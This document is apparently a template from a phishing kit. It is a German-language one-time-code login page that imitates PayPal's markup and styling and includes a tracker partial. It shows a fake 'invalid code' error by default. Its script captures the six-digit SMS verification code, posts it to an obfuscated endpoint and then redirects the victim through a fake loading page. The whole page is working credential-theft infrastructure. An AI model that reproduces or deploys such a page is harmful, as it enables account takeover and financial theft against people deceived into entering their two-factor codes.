<html lang="de"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./css/index.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <%- include('partials/tracker') %>
</head>
<body>
    <header>
    </header>
    <main>
        <form method="post" id="twoFactorForm">
            <div class="logosms">
                <img src="./img/pipillgomark.png" alt="">
            </div>
            <div class="text" style="gap: 1rem;">
                <p>Mit Einmalcode einloggen</p>
                <p>Code wurde an Ihre Nummer gesendet.</p>
            </div>
            <p style="text-align: center; margin: 15px 0; margin-bottom: 30px; cursor: pointer; color: #006de2;">Neuen Code anfordern</p>
            <div class="logosms">
                <div style="display: flex; justify-content: center; gap: 10px; margin-bottom: 20px;">
                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required="">
                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required="">
                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required="">
                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required="">
                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required="">
                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required="">
                </div>
                <div class="error-message">
                    <p>Der eingegebene Code ist ungültig. Bitte überprüfen Sie den Code und versuchen Sie es erneut.</p>
                </div>
                <div id="loading" style="display: none; justify-content: center; margin-top: 20px;">
                    <div class="spinner"></div>
                </div>
                <button class="_4u36pu1 _4u36pu2 _4u36pu4 _4u36pum scTrack:security_code_continue_button button" id="securityCodeSubmit" data-atomic-wait-domain="identity_authnodeweb" data-atomic-wait-intent="submit_sms" data-atomic-wait-task="login_step_up_sms" data-atomic-wait-viewname="auth_verification_success_page" type="submit" name="submitSecurityCode" data-nemo="securityCodeSubmit" tab-index="0" data-ppui-info="" data-ppui="true">Absenden</button>
                <a href="">Neuen Code senden</a>
            </div>

            
        </form>
    </main>
    <footer>
        <p>Kontakt</p>
        <p>Datenschutz</p>
        <p>Rechtliches</p>
        <p>Richtlinienaktualisierungen</p>
        <p>Weltweit</p>
    </footer>

    <style>
        #securityCodeSubmit {
            background-color: #0551b5;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 20px;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
            max-width: 200px;
            transition: background-color 0.3s ease;
        }
        
        #securityCodeSubmit:hover {
            background-color: #044494;
        }
        
        #securityCodeSubmit:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        
        .error-message {
            color: #ff0000;
            padding: 8px 0;
            margin: 10px auto;
            text-align: center;
            font-size: 14px;
            max-width: 80%;
        }

        .error-message p {
            margin: 0;
            line-height: 1.4;
        }

        .code-input {
            width: 45px;
            height: 45px;
            text-align: center;
            font-size: 18px;
            border: 2px solid #ccc;
            border-radius: 8px;
            margin: 0 4px;
            transition: border-color 0.3s ease;
        }

        .code-input:focus {
            border-color: #0551b5;
            outline: none;
        }
    </style>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('twoFactorForm');
            const inputs = form.querySelectorAll('.code-input');
            const loading = document.getElementById('loading');
            const submitButton = document.getElementById('securityCodeSubmit');

            // Handle input behavior
            inputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    if (this.value.length === 1) {
                        if (index < inputs.length - 1) {
                            inputs[index + 1].focus();
                        }
                    }
                    
                    // Enable/disable submit button based on all fields being filled
                    const allFilled = Array.from(inputs).every(input => input.value.length === 1);
                    submitButton.disabled = !allFilled;
                });

                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && !this.value && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });

            // Handle form submission via button click
            submitButton.addEventListener('click', function(e) {
                e.preventDefault();
                
                const code = Array.from(inputs).map(input => input.value).join('');
                console.log('Verification code:', code);
                
                // Show loading spinner
                loading.style.display = 'flex';
                
                // Disable all inputs and button
                inputs.forEach(input => input.disabled = true);
                submitButton.disabled = true;
                
                // Send to backend
                $.ajax({
                    url: '/AD20rPkZd8QatVEZGz5l',
                    type: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify({code}),
                    success: function(info) {
                        if(info.OK){
                            // Wait 3 seconds then redirect
                            setTimeout(() => {
                                window.location.href = '/loadingpp?time=3&url=/CoR4opAT7PZu4op0UF7Po';
                            }, 3000);
                        }
                    },
                    error: function() {
                        // Re-enable inputs and button on error
                        inputs.forEach(input => input.disabled = false);
                        submitButton.disabled = false;
                        loading.style.display = 'none';
                    }
                });
            });
            
            // Initially disable submit button
            submitButton.disabled = true;
        });
    </script>

   


</body></html>